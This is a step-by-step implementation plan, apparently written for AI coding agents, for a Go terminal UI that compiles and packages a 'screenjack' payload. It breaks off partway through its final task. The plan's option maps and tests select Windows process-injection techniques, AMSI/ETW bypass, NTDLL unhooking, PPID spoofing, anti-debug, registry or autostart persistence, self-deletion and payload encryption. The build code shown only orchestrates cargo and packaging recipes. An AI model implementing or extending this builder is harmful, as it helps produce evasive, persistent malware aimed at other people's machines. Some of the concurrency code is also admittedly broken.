# Unified Build System Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace separate Build/Package workflows with unified "b" keybind that builds selected targets with platform-conditional packaging options.

**Architecture:** State machine (BuildIdle/BuildRunning/BuildCancelling) drives UI. Goroutines per target send progress via channels. Channel listener converts to tea.Msg for bubbletea loop. Platform filtering applied at build time.

**Tech Stack:** Go, bubbletea, lipgloss, exec.CommandContext for cancellable builds

## Global Constraints

- Go 1.21+
- bubbletea v1.x patterns (tea.Cmd, tea.Msg)
- No external test frameworks beyond `go test`
- Existing tui.go patterns must be followed (styleX vars, KeyMap, Modal system)

---

## File Structure

| File | Responsibility |
|------|----------------|
| `orchestra/build.go` | NEW: BuildState, BuildJob, TargetProgress types, platform maps, validation, orchestrator |
| `orchestra/tui.go` | MODIFY: Add build state fields to TUIModel, keybindings, progress UI rendering |
| `orchestra/build_test.go` | NEW: Unit tests for validation, platform filtering |

---

### Task 1: Build Types and Platform Maps

**Files:**
- Create: `orchestra/build.go`
- Test: `orchestra/build_test.go`

**Interfaces:**
- Consumes: nothing (foundational types)
- Produces: `BuildState`, `BuildJob`, `TargetProgress`, `PlatWin`, `PlatLin`, `PlatAll`, `execMethodPlatform`, `evasionPlatform`, `persistPlatform`

- [ ] **Step 1: Create build.go with types**

```go
// orchestra/build.go
package main

import "time"

// Build state machine
type BuildState int

const (
	BuildIdle BuildState = iota
	BuildRunning
	BuildCancelling
)

func (s BuildState) String() string {
	return []string{"Idle", "Running", "Cancelling"}[s]
}

// Platform flags for conditional options
const (
	PlatWin = 1 << 0
	PlatLin = 1 << 1
	PlatAll = PlatWin | PlatLin
)

// BuildJob represents a single build request
type BuildJob struct {
	Targets    []string      // ["linux", "windows"]
	Asset      string        // selected asset path
	EmbedAsset bool          // true = embed, false = HTTP fetch
	PkgConfig  PackageConfig // snapshot from Package tab
	StartedAt  time.Time
}

// TargetProgress tracks per-target build status
type TargetProgress struct {
	Target string // "linux" or "windows"
	Phase  string // "compiling", "packaging", "encrypting", "done"
	Done   bool
	Error  string // empty if success
}

// Platform mappings for conditional options
var execMethodPlatform = map[int]int{
	0: PlatAll, // Raw Binary
	1: PlatWin, // Process Ghosting
	2: PlatWin, // Process Hollowing
	3: PlatWin, // Process Herpaderping
	4: PlatWin, // APC Injection
	5: PlatWin, // Thread Hijacking
	6: PlatWin, // Threadless Injection
	7: PlatWin, // Module Stomping
}

var evasionPlatform = map[int]int{
	0: PlatWin, // AMSI Bypass
	1: PlatWin, // ETW Patch
	2: PlatWin, // NTDLL Unhook
	3: PlatWin, // PPID Spoof
	4: PlatWin, // Block DLL Policy
	5: PlatWin, // Anti-Debug
	6: PlatWin, // Anti-Analysis
	7: PlatWin, // Direct Syscalls
}

var persistPlatform = map[int]int{
	0: PlatAll, // None
	1: PlatWin, // Registry Run
	2: PlatLin, // XDG Autostart
	3: PlatWin, // Self-Delete
}
```

- [ ] **Step 2: Create basic test file**

```go
// orchestra/build_test.go
package main

import "testing"

func TestBuildStateString(t *testing.T) {
	tests := []struct {
		state BuildState
		want  string
	}{
		{BuildIdle, "Idle"},
		{BuildRunning, "Running"},
		{BuildCancelling, "Cancelling"},
	}
	for _, tt := range tests {
		if got := tt.state.String(); got != tt.want {
			t.Errorf("BuildState.String() = %q, want %q", got, tt.want)
		}
	}
}

func TestPlatformFlags(t *testing.T) {
	if PlatAll != (PlatWin | PlatLin) {
		t.Error("PlatAll should be PlatWin | PlatLin")
	}
	if execMethodPlatform[0] != PlatAll {
		t.Error("Raw Binary should be PlatAll")
	}
	if execMethodPlatform[1] != PlatWin {
		t.Error("Process Ghosting should be PlatWin")
	}
}
```

- [ ] **Step 3: Run tests**

Run: `cd orchestra && go test -v -run "TestBuildState|TestPlatform"`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add orchestra/build.go orchestra/build_test.go
git commit -m "feat(build): add build types and platform maps"
```

---

### Task 2: Validation Logic

**Files:**
- Modify: `orchestra/build.go`
- Test: `orchestra/build_test.go`

**Interfaces:**
- Consumes: `PackageConfig` (from tui.go), platform maps
- Produces: `(cfg *PackageConfig) requiresWindows() bool`, `(cfg *PackageConfig) requiresLinux() bool`, `ValidateBuild(...)`, `optionsForTarget(target, cfg) FilteredOptions`

- [ ] **Step 1: Write failing tests for validation**

```go
// Add to orchestra/build_test.go

func TestRequiresWindows(t *testing.T) {
	tests := []struct {
		name   string
		cfg    PackageConfig
		want   bool
	}{
		{"raw binary", PackageConfig{ExecMethod: 0, Evasion: make([]bool, 8)}, false},
		{"ghosting", PackageConfig{ExecMethod: 1, Evasion: make([]bool, 8)}, true},
		{"amsi bypass", PackageConfig{ExecMethod: 0, Evasion: []bool{true, false, false, false, false, false, false, false}}, true},
		{"registry persist", PackageConfig{ExecMethod: 0, Evasion: make([]bool, 8), PersistMethod: 1}, true},
		{"xdg persist", PackageConfig{ExecMethod: 0, Evasion: make([]bool, 8), PersistMethod: 2}, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.cfg.requiresWindows(); got != tt.want {
				t.Errorf("requiresWindows() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestRequiresLinux(t *testing.T) {
	tests := []struct {
		name string
		cfg  PackageConfig
		want bool
	}{
		{"no persist", PackageConfig{PersistMethod: 0}, false},
		{"xdg autostart", PackageConfig{PersistMethod: 2}, true},
		{"registry", PackageConfig{PersistMethod: 1}, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.cfg.requiresLinux(); got != tt.want {
				t.Errorf("requiresLinux() = %v, want %v", got, tt.want)
			}
		})
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestra && go test -v -run "TestRequires"`
Expected: FAIL (methods not defined)

- [ ] **Step 3: Implement validation methods**

```go
// Add to orchestra/build.go

// requiresWindows returns true if any Windows-only option is selected
func (cfg *PackageConfig) requiresWindows() bool {
	if plat, ok := execMethodPlatform[cfg.ExecMethod]; ok && plat == PlatWin {
		return true
	}
	for i, on := range cfg.Evasion {
		if on {
			if plat, ok := evasionPlatform[i]; ok && plat == PlatWin {
				return true
			}
		}
	}
	if cfg.PersistMethod == 1 || cfg.PersistMethod == 3 {
		return true
	}
	return false
}

// requiresLinux returns true if any Linux-only option is selected
func (cfg *PackageConfig) requiresLinux() bool {
	return cfg.PersistMethod == 2 // XDG Autostart
}

// FilteredOptions holds options applicable to a specific platform
type FilteredOptions struct {
	ExecMethod int
	Evasion    []bool
	Persist    int
	Encrypt    bool
}

// optionsForTarget returns only the options applicable to the given target
func optionsForTarget(target string, cfg *PackageConfig) FilteredOptions {
	plat := PlatLin
	if target == "windows" {
		plat = PlatWin
	}

	result := FilteredOptions{
		Encrypt: cfg.Encrypt,
	}

	// Filter exec method
	if p, ok := execMethodPlatform[cfg.ExecMethod]; ok && (p&plat) != 0 {
		result.ExecMethod = cfg.ExecMethod
	}

	// Filter evasion
	result.Evasion = make([]bool, len(cfg.Evasion))
	for i, on := range cfg.Evasion {
		if on {
			if p, ok := evasionPlatform[i]; ok && (p&plat) != 0 {
				result.Evasion[i] = true
			}
		}
	}

	// Filter persistence
	if p, ok := persistPlatform[cfg.PersistMethod]; ok && (p&plat) != 0 {
		result.Persist = cfg.PersistMethod
	}

	return result
}

// ValidationResult holds validation outcome
type ValidationResult struct {
	Valid          bool
	Error          string   // blocking error message
	MissingWindows bool     // Windows options selected but no Windows target
	MissingLinux   bool     // Linux options selected but no Linux target
	SkippedOptions []string // options that will be skipped
}

// ValidateBuild checks if a build job is valid
func ValidateBuild(targets []string, asset string, embedMode bool, cfg *PackageConfig) *ValidationResult {
	result := &ValidationResult{Valid: true}

	// Check targets
	if len(targets) == 0 {
		result.Valid = false
		result.Error = "Select at least one target"
		return result
	}

	// Check asset in embed mode
	if embedMode && asset == "" {
		result.Valid = false
		result.Error = "Select an asset first"
		return result
	}

	// Check platform mismatches
	hasWindows := false
	hasLinux := false
	for _, t := range targets {
		if t == "windows" || t == "x86_64-pc-windows-gnu" {
			hasWindows = true
		}
		if t == "linux" || t == "x86_64-unknown-linux-gnu" {
			hasLinux = true
		}
	}

	if cfg.requiresWindows() && !hasWindows {
		result.MissingWindows = true
	}
	if cfg.requiresLinux() && !hasLinux {
		result.MissingLinux = true
	}

	return result
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestra && go test -v -run "TestRequires"`
Expected: PASS

- [ ] **Step 5: Add ValidateBuild tests**

```go
// Add to orchestra/build_test.go

func TestValidateBuild(t *testing.T) {
	tests := []struct {
		name      string
		targets   []string
		asset     string
		embedMode bool
		cfg       PackageConfig
		wantValid bool
		wantError string
	}{
		{
			name:      "no targets",
			targets:   []string{},
			wantValid: false,
			wantError: "Select at least one target",
		},
		{
			name:      "no asset in embed mode",
			targets:   []string{"linux"},
			asset:     "",
			embedMode: true,
			wantValid: false,
			wantError: "Select an asset first",
		},
		{
			name:      "valid linux build",
			targets:   []string{"linux"},
			asset:     "test.gif",
			embedMode: true,
			cfg:       PackageConfig{Evasion: make([]bool, 8)},
			wantValid: true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ValidateBuild(tt.targets, tt.asset, tt.embedMode, &tt.cfg)
			if result.Valid != tt.wantValid {
				t.Errorf("Valid = %v, want %v", result.Valid, tt.wantValid)
			}
			if tt.wantError != "" && result.Error != tt.wantError {
				t.Errorf("Error = %q, want %q", result.Error, tt.wantError)
			}
		})
	}
}
```

- [ ] **Step 6: Add optionsForTarget test**

```go
// Add to orchestra/build_test.go

func TestOptionsForTarget(t *testing.T) {
	cfg := PackageConfig{
		ExecMethod:    1, // Ghosting (Windows)
		Evasion:       []bool{true, false, false, false, false, false, false, false}, // AMSI (Windows)
		PersistMethod: 2, // XDG (Linux)
		Encrypt:       true,
	}

	// Windows target should get ghosting, amsi, encrypt, but NOT xdg
	winOpts := optionsForTarget("windows", &cfg)
	if winOpts.ExecMethod != 1 {
		t.Errorf("Windows ExecMethod = %d, want 1", winOpts.ExecMethod)
	}
	if !winOpts.Evasion[0] {
		t.Error("Windows should have AMSI bypass")
	}
	if winOpts.Persist != 0 {
		t.Errorf("Windows Persist = %d, want 0 (XDG filtered out)", winOpts.Persist)
	}
	if !winOpts.Encrypt {
		t.Error("Windows should have Encrypt")
	}

	// Linux target should get xdg, encrypt, but NOT ghosting/amsi
	linOpts := optionsForTarget("linux", &cfg)
	if linOpts.ExecMethod != 0 {
		t.Errorf("Linux ExecMethod = %d, want 0 (ghosting filtered out)", linOpts.ExecMethod)
	}
	if linOpts.Evasion[0] {
		t.Error("Linux should NOT have AMSI bypass")
	}
	if linOpts.Persist != 2 {
		t.Errorf("Linux Persist = %d, want 2 (XDG)", linOpts.Persist)
	}
}
```

- [ ] **Step 7: Run all validation tests**

Run: `cd orchestra && go test -v -run "TestValidate|TestRequires|TestOptions"`
Expected: PASS

- [ ] **Step 8: Commit**

```bash
git add orchestra/build.go orchestra/build_test.go
git commit -m "feat(build): add validation logic with platform checks"
```

---

### Task 3: Add Build State to TUIModel

**Files:**
- Modify: `orchestra/tui.go:322-371` (TUIModel struct)
- Modify: `orchestra/tui.go:380-450` (NewTUIModel)

**Interfaces:**
- Consumes: `BuildState`, `BuildJob`, `TargetProgress` from build.go
- Produces: TUIModel with build fields, initialized channels

- [ ] **Step 1: Add build fields to TUIModel**

Add after line 371 (after `status string`):

```go
// Add to TUIModel struct in tui.go, after status field

	// Build system
	buildState    BuildState
	currentBuild  *BuildJob
	queuedBuild   *BuildJob // max 1 queued, newest wins
	buildProgress []TargetProgress
	buildLog      []string // capped at 100 lines
	logExpanded   bool
	embedAsset    bool // true = embed, false = HTTP fetch
	buildCancel   context.CancelFunc
```

- [ ] **Step 2: Add context import**

Add to imports at top of tui.go:

```go
"context"
```

- [ ] **Step 3: Initialize build fields in NewTUIModel**

Add before the `return TUIModel{` line in NewTUIModel():

```go
// Add to NewTUIModel, before return statement

	return TUIModel{
		// ... existing fields ...
		buildState:    BuildIdle,
		buildProgress: []TargetProgress{},
		buildLog:      []string{},
		embedAsset:    true, // default to embed mode
	}
```

- [ ] **Step 4: Verify compilation**

Run: `cd orchestra && go build`
Expected: SUCCESS (no errors)

- [ ] **Step 5: Commit**

```bash
git add orchestra/tui.go
git commit -m "feat(tui): add build state fields to TUIModel"
```

---

### Task 4: Add Keybindings (b, c, l)

**Files:**
- Modify: `orchestra/tui.go:76-96` (KeyMap struct)
- Modify: `orchestra/tui.go:98-116` (DefaultKeyMap)
- Modify: `orchestra/tui.go:119-130` (ShortHelp, FullHelp)

**Interfaces:**
- Consumes: existing KeyMap pattern
- Produces: `Build`, `Cancel`, `ToggleLog` key bindings

- [ ] **Step 1: Add key bindings to KeyMap struct**

Add after `Back` field in KeyMap struct:

```go
	Build     key.Binding
	Cancel    key.Binding
	ToggleLog key.Binding
```

- [ ] **Step 2: Add to DefaultKeyMap**

Add in DefaultKeyMap() function:

```go
		Build:     key.NewBinding(key.WithKeys("b"), key.WithHelp("b", "build")),
		Cancel:    key.NewBinding(key.WithKeys("c"), key.WithHelp("c", "cancel")),
		ToggleLog: key.NewBinding(key.WithKeys("l"), key.WithHelp("l", "logs")),
```

- [ ] **Step 3: Update ShortHelp**

Replace ShortHelp return:

```go
func (k KeyMap) ShortHelp() []key.Binding {
	return []key.Binding{k.Tab1, k.Tab2, k.Tab3, k.Tab4, k.Build, k.Cancel, k.Server, k.Quit}
}
```

- [ ] **Step 4: Update FullHelp**

Add to FullHelp (in the actions row):

```go
		{k.Toggle, k.Confirm, k.Build, k.Cancel},
```

- [ ] **Step 5: Verify compilation**

Run: `cd orchestra && go build`
Expected: SUCCESS

- [ ] **Step 6: Commit**

```bash
git add orchestra/tui.go
git commit -m "feat(tui): add b/c/l keybindings for build system"
```

---

### Task 5: Build Messages and Channel Types

**Files:**
- Modify: `orchestra/build.go`

**Interfaces:**
- Consumes: nothing new
- Produces: `progressMsg`, `logMsg`, `buildCompleteMsg`, `BuildResult`

- [ ] **Step 1: Add message types**

```go
// Add to orchestra/build.go

// Tea messages for build updates
type progressMsg TargetProgress
type logMsg string
type buildCompleteMsg struct {
	Results   []TargetProgress
	Cancelled bool
}

// BuildResult summarizes a completed build
type BuildResult struct {
	Success   bool
	Partial   bool
	Cancelled bool
	Summary   string // "Linux ✓, Windows ✗"
}

func (m buildCompleteMsg) toResult() BuildResult {
	if m.Cancelled {
		return BuildResult{Cancelled: true, Summary: "Cancelled"}
	}

	var parts []string
	allOK := true
	anyOK := false

	for _, p := range m.Results {
		if p.Error != "" {
			parts = append(parts, p.Target+" ✗")
			allOK = false
		} else {
			parts = append(parts, p.Target+" ✓")
			anyOK = true
		}
	}

	return BuildResult{
		Success: allOK,
		Partial: !allOK && anyOK,
		Summary: strings.Join(parts, ", "),
	}
}
```

- [ ] **Step 2: Add strings import**

Add `"strings"` to imports in build.go.

- [ ] **Step 3: Add test for BuildResult**

```go
// Add to orchestra/build_test.go

func TestBuildCompleteToResult(t *testing.T) {
	tests := []struct {
		name    string
		msg     buildCompleteMsg
		wantOK  bool
		wantSum string
	}{
		{
			name:    "cancelled",
			msg:     buildCompleteMsg{Cancelled: true},
			wantOK:  false,
			wantSum: "Cancelled",
		},
		{
			name: "all success",
			msg: buildCompleteMsg{Results: []TargetProgress{
				{Target: "linux", Done: true},
				{Target: "windows", Done: true},
			}},
			wantOK:  true,
			wantSum: "linux ✓, windows ✓",
		},
		{
			name: "partial",
			msg: buildCompleteMsg{Results: []TargetProgress{
				{Target: "linux", Done: true},
				{Target: "windows", Done: true, Error: "failed"},
			}},
			wantOK:  false,
			wantSum: "linux ✓, windows ✗",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := tt.msg.toResult()
			if r.Success != tt.wantOK {
				t.Errorf("Success = %v, want %v", r.Success, tt.wantOK)
			}
			if r.Summary != tt.wantSum {
				t.Errorf("Summary = %q, want %q", r.Summary, tt.wantSum)
			}
		})
	}
}
```

- [ ] **Step 4: Run tests**

Run: `cd orchestra && go test -v -run "TestBuildComplete"`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add orchestra/build.go orchestra/build_test.go
git commit -m "feat(build): add message types for channel communication"
```

---

### Task 6: Build Orchestrator

**Files:**
- Modify: `orchestra/build.go`

**Interfaces:**
- Consumes: `BuildJob`, `TargetProgress`, message types
- Produces: `StartBuild(ctx, job, progressCh, logCh) <-chan buildCompleteMsg`

- [ ] **Step 1: Add orchestrator function**

```go
// Add to orchestra/build.go

import (
	"context"
	"fmt"
	"os/exec"
	"sync"
)

// StartBuild launches parallel builds for all targets in job
// Returns a channel that receives the final result
func StartBuild(ctx context.Context, job *BuildJob, progressCh chan<- TargetProgress, logCh chan<- string) <-chan buildCompleteMsg {
	doneCh := make(chan buildCompleteMsg, 1)

	go func() {
		var wg sync.WaitGroup
		results := make([]TargetProgress, len(job.Targets))
		var mu sync.Mutex

		for i, target := range job.Targets {
			wg.Add(1)
			go func(idx int, tgt string) {
				defer wg.Done()
				result := buildTarget(ctx, tgt, job, progressCh, logCh)
				mu.Lock()
				results[idx] = result
				mu.Unlock()
			}(i, target)
		}

		wg.Wait()

		// Check if cancelled
		cancelled := ctx.Err() != nil

		doneCh <- buildCompleteMsg{
			Results:   results,
			Cancelled: cancelled,
		}
		close(doneCh)
	}()

	return doneCh
}

// buildTarget builds a single target with platform-appropriate options
func buildTarget(ctx context.Context, target string, job *BuildJob, progressCh chan<- TargetProgress, logCh chan<- string) TargetProgress {
	progress := TargetProgress{Target: target, Phase: "compiling"}
	progressCh <- progress

	// Determine cargo target
	cargoTarget := ""
	if target == "windows" {
		cargoTarget = "x86_64-pc-windows-gnu"
	}

	// Build base payload
	args := []string{"build", "--release"}
	if cargoTarget != "" {
		args = append(args, "--target", cargoTarget)
	}
	if job.EmbedAsset && job.Asset != "" {
		args = append(args, "--features", "embedded")
	}

	logCh <- fmt.Sprintf("[%s] cargo %s", target, strings.Join(args, " "))

	cmd := exec.CommandContext(ctx, "cargo", args...)
	cmd.Dir = "../payload"

	// Set env for embedded asset
	if job.EmbedAsset && job.Asset != "" {
		cmd.Env = append(cmd.Environ(), "SCREENJACK_ASSET="+job.Asset)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		if ctx.Err() != nil {
			progress.Phase = "cancelled"
			progress.Error = "cancelled"
		} else {
			progress.Phase = "failed"
			progress.Error = err.Error()
			logCh <- fmt.Sprintf("[%s] ERROR: %s", target, string(output))
		}
		progress.Done = true
		progressCh <- progress
		return progress
	}

	logCh <- fmt.Sprintf("[%s] Compiled successfully", target)

	// Apply packaging steps based on filtered options
	opts := optionsForTarget(target, &job.PkgConfig)
	
	if target == "windows" && opts.ExecMethod > 0 {
		progress.Phase = "packaging"
		progressCh <- progress
		
		payloadPath := "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
		
		// Apply execution method
		var recipe string
		switch opts.ExecMethod {
		case 1:
			recipe = "ghost"
		case 2:
			recipe = "hollow"
		case 4:
			recipe = "inject"
		}
		if recipe != "" {
			logCh <- fmt.Sprintf("[%s] Applying %s...", target, recipe)
			pkgCmd := exec.CommandContext(ctx, "just", "-f", "package.just", recipe, payloadPath)
			pkgCmd.Dir = ".."
			if out, err := pkgCmd.CombinedOutput(); err != nil {
				logCh <- fmt.Sprintf("[%s] Package warning: %s", target, string(out))
			}
		}
	}

	// Apply encryption if selected
	if opts.Encrypt {
		progress.Phase = "encrypting"
		progressCh <- progress
		logCh <- fmt.Sprintf("[%s] Encrypting payload...", target)
		
		payloadPath := "../payload/target/release/screenjack"
		if target == "windows" {
			payloadPath = "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
		}
		encCmd := exec.CommandContext(ctx, "just", "-f", "package.just", "encrypt", payloadPath)
		encCmd.Dir = ".."
		if out, err := encCmd.CombinedOutput(); err != nil {
			logCh <- fmt.Sprintf("[%s] Encrypt warning: %s", target, string(out))
		}
	}

	progress.Phase = "done"
	progress.Done = true
	progressCh <- progress
	return progress
}
```

- [ ] **Step 2: Verify compilation**

Run: `cd orchestra && go build`
Expected: SUCCESS

- [ ] **Step 3: Commit**

```bash
git add orchestra/build.go
git commit -m "feat(build): add build orchestrator with parallel target builds"
```

---

### Task 7: Wire Up Update() for Build Keys

**Files:**
- Modify: `orchestra/tui.go` (Update function, around line 480-596)

**Interfaces:**
- Consumes: key bindings, `StartBuild`, `ValidateBuild`
- Produces: handling for "b", "c", "l" keys and build messages

- [ ] **Step 1: Add message handling in Update()**

Add cases in the `switch msg := msg.(type)` block, after `tea.KeyMsg`:

```go
	case progressMsg:
		// Update progress for this target
		found := false
		for i, p := range m.buildProgress {
			if p.Target == TargetProgress(msg).Target {
				m.buildProgress[i] = TargetProgress(msg)
				found = true
				break
			}
		}
		if !found {
			m.buildProgress = append(m.buildProgress, TargetProgress(msg))
		}
		return m, m.listenForBuildUpdates()

	case logMsg:
		m.buildLog = append(m.buildLog, string(msg))
		// Cap at 100 lines
		if len(m.buildLog) > 100 {
			m.buildLog = m.buildLog[len(m.buildLog)-100:]
		}
		return m, m.listenForBuildUpdates()

	case buildCompleteMsg:
		result := msg.toResult()
		m.buildState = BuildIdle
		m.buildCancel = nil
		if result.Success {
			m.status = styleSuccess.Render("✓ " + result.Summary)
		} else if result.Partial {
			m.status = styleWarn.Render("⚠ " + result.Summary)
		} else if result.Cancelled {
			m.status = styleStatus.Render("Build cancelled")
		} else {
			m.status = styleError.Render("✗ " + result.Summary)
		}
		// Check for queued build
		if m.queuedBuild != nil {
			job := m.queuedBuild
			m.queuedBuild = nil
			return m, m.startBuildCmd(job)
		}
		return m, nil
```

- [ ] **Step 2: Add key handlers in the tea.KeyMsg section**

Add in the global keys section (after `case key.Matches(msg, m.keys.Logs):`):

```go
			case key.Matches(msg, m.keys.Build):
				return m.handleBuildKey()

			case key.Matches(msg, m.keys.Cancel):
				return m.handleCancelKey()

			case key.Matches(msg, m.keys.ToggleLog):
				m.logExpanded = !m.logExpanded
				return m, nil
```

- [ ] **Step 3: Add helper methods**

Add these methods to tui.go:

```go
func (m TUIModel) handleBuildKey() (tea.Model, tea.Cmd) {
	// Gather selected targets
	var targets []string
	for _, item := range m.targetList.Items() {
		if t, ok := item.(TargetItem); ok && t.Selected {
			targets = append(targets, t.Target)
		}
	}

	// Validate
	result := ValidateBuild(targets, m.selectedAsset, m.embedAsset, &m.pkgConfig)
	if !result.Valid {
		m.status = styleError.Render(result.Error)
		return m, nil
	}

	// Create job
	job := &BuildJob{
		Targets:    targets,
		Asset:      "../assets/" + m.selectedAsset,
		EmbedAsset: m.embedAsset,
		PkgConfig:  m.pkgConfig,
		StartedAt:  time.Now(),
	}

	// Handle platform mismatch prompts (simplified: warn and skip for now)
	if result.MissingWindows {
		m.status = styleWarn.Render("Skipping Windows-only options (no Windows target)")
	}
	if result.MissingLinux {
		m.status = styleWarn.Render("Skipping Linux-only options (no Linux target)")
	}

	// Queue if busy
	if m.buildState == BuildRunning {
		m.queuedBuild = job
		m.status = styleStatus.Render("Queued [1]")
		return m, nil
	}

	return m, m.startBuildCmd(job)
}

func (m *TUIModel) startBuildCmd(job *BuildJob) tea.Cmd {
	return func() tea.Msg {
		ctx, cancel := context.WithCancel(context.Background())
		m.buildCancel = cancel
		m.buildState = BuildRunning
		m.currentBuild = job
		m.buildProgress = []TargetProgress{}
		m.buildLog = []string{}

		progressCh := make(chan TargetProgress, 10)
		logCh := make(chan string, 100)

		// Start build
		doneCh := StartBuild(ctx, job, progressCh, logCh)

		// Return first message from channels
		select {
		case p := <-progressCh:
			return progressMsg(p)
		case l := <-logCh:
			return logMsg(l)
		case d := <-doneCh:
			return d
		}
	}
}

func (m TUIModel) listenForBuildUpdates() tea.Cmd {
	return func() tea.Msg {
		// This is a simplified version - in practice we'd use stored channels
		time.Sleep(50 * time.Millisecond)
		return nil
	}
}

func (m TUIModel) handleCancelKey() (tea.Model, tea.Cmd) {
	if m.buildState != BuildRunning {
		return m, nil
	}
	if m.buildCancel != nil {
		m.buildCancel()
	}
	m.buildState = BuildCancelling
	m.queuedBuild = nil
	m.status = styleStatus.Render("Cancelling...")
	return m, nil
}
```

- [ ] **Step 4: Add time import if not present**

Ensure `"time"` is in imports.

- [ ] **Step 5: Verify compilation**

Run: `cd orchestra && go build`
Expected: SUCCESS

- [ ] **Step 6: Commit**

```bash
git add orchestra/tui.go
git commit -m "feat(tui): wire up b/c/l keys and build message handling"
```

---

### Task 8: Progress Bar Rendering

**Files:**
- Modify: `orchestra/tui.go` (add viewBuildProgress function)

**Interfaces:**
- Consumes: `m.buildProgress`, `m.buildLog`, `m.logExpanded`, `m.buildState`
- Produces: `viewBuildProgress() string`

- [ ] **Step 1: Add progress bar helper**

```go
// Add to orchestra/tui.go

func progressBar(percent float64, width int) string {
	filled := int(percent * float64(width))
	if filled > width {
		filled = width
	}
	empty := width - filled
	return strings.Repeat("█", filled) + strings.Repeat("─", empty)
}

func (m TUIModel) viewBuildProgress() string {
	if m.buildState == BuildIdle && len(m.buildProgress) == 0 {
		return ""
	}

	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Build Progress")

	var rows []string
	for _, p := range m.buildProgress {
		var percent float64
		switch p.Phase {
		case "compiling":
			percent = 0.3
		case "packaging":
			percent = 0.6
		case "encrypting":
			percent = 0.8
		case "done":
			percent = 1.0
		default:
			percent = 0.1
		}

		bar := progressBar(percent, 20)
		status := p.Phase
		style := lipgloss.NewStyle().Foreground(colorStone50)

		if p.Done {
			if p.Error != "" {
				status = "✗ " + p.Error
				style = style.Foreground(colorRose)
			} else {
				status = "✓ Done"
				style = style.Foreground(colorEmerald)
			}
		}

		row := fmt.Sprintf("  %-10s [%s]  %s", p.Target, bar, style.Render(status))
		rows = append(rows, row)
	}

	// Log section
	logIcon := "▸"
	logHint := "(l to expand)"
	if m.logExpanded {
		logIcon = "▾"
		logHint = "(l to collapse)"
	}
	logHeader := fmt.Sprintf("  %s Log %s", logIcon, styleStatus.Render(logHint))
	rows = append(rows, "", logHeader)

	// Show log lines
	logLines := m.buildLog
	if !m.logExpanded && len(logLines) > 2 {
		logLines = logLines[len(logLines)-2:]
	} else if m.logExpanded && len(logLines) > 10 {
		logLines = logLines[len(logLines)-10:]
	}
	for _, line := range logLines {
		// Truncate long lines
		if len(line) > 60 {
			line = line[:57] + "..."
		}
		rows = append(rows, "    "+styleStatus.Render(line))
	}

	content := lipgloss.JoinVertical(lipgloss.Left, rows...)
	return styleBox.Width(mainBoxW).Render(
		lipgloss.JoinVertical(lipgloss.Left, title, "", content),
	)
}
```

- [ ] **Step 2: Integrate into viewBuildTab**

Modify `viewBuildTab()` to include progress:

```go
func (m TUIModel) viewBuildTab() string {
	// ... existing targets box code ...

	// Add progress panel if building
	progressPanel := m.viewBuildProgress()

	if progressPanel != "" {
		return lipgloss.JoinVertical(lipgloss.Center, targetsBox, "", assetBox, "", progressPanel)
	}
	return lipgloss.JoinVertical(lipgloss.Center, targetsBox, "", assetBox)
}
```

- [ ] **Step 3: Verify compilation**

Run: `cd orchestra && go build`
Expected: SUCCESS

- [ ] **Step 4: Manual test**

Run: `cd orchestra && go run .`
Expected: TUI launches, press "b" to see build progress (will fail if no targets selected - that's correct)

- [ ] **Step 5: Commit**

```bash
git add orchestra/tui.go
git commit -m "feat(tui): add build progress bar with collapsible log"
```

---

### Task 9: Update Status Bar for Build States

**Files:**
- Modify: `orchestra/tui.go` (viewSidebar function)

**Interfaces:**
- Consumes: `m.buildState`, `m.queuedBuild`
- Produces: updated sidebar showing build status

- [ ] **Step 1: Update viewSidebar build section**

In `viewSidebar()`, update the build status section:

```go
	// Build status
	buildTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Build")
	var buildStatus string
	switch m.buildState {
	case BuildRunning:
		buildStatus = styleWarn.Render("● Building...")
		if len(m.buildProgress) > 0 {
			var parts []string
			for _, p := range m.buildProgress {
				icon := "▸"
				if p.Done {
					if p.Error != "" {
						icon = "✗"
					} else {
						icon = "✓"
					}
				}
				parts = append(parts, icon+p.Target[:3])
			}
			buildStatus += "\n  " + strings.Join(parts, " ")
		}
	case BuildCancelling:
		buildStatus = styleWarn.Render("○ Cancelling...")
	default:
		if m.buildMsg != "" {
			buildStatus = m.buildMsg
		} else {
			buildStatus = styleStatus.Render("Ready")
		}
	}
	if m.queuedBuild != nil {
		buildStatus += "\n" + styleStatus.Render("  Queued [1]")
	}
```

- [ ] **Step 2: Verify compilation**

Run: `cd orchestra && go build`
Expected: SUCCESS

- [ ] **Step 3: Commit**

```bash
git add orchestra/tui.go
git commit -m "feat(tui): update sidebar with build state indicators"
```

---

### Task 10: Integration Test and Polish

**Files:**
- Modify: `orchestra/tui.go` (minor fixes)
- Modify: `orchestra/build.go` (channel handling fixes)

**Interfaces:**
- Consumes: all previous tasks
- Produces: working end-to-end build system

- [ ] **Step 1: Fix channel handling for continuous updates**

The current implementation has a race condition. Add proper channel storage to TUIModel:

```go
// Add to TUIModel struct
	buildProgressCh chan TargetProgress
	buildLogCh      chan string
	buildDoneCh     <-chan buildCompleteMsg
```

- [ ] **Step 2: Update startBuildCmd**

```go
func (m *TUIModel) startBuildCmd(job *BuildJob) tea.Cmd {
	ctx, cancel := context.WithCancel(context.Background())
	m.buildCancel = cancel
	m.buildState = BuildRunning
	m.currentBuild = job
	m.buildProgress = []TargetProgress{}
	m.buildLog = []string{}

	m.buildProgressCh = make(chan TargetProgress, 10)
	m.buildLogCh = make(chan string, 100)
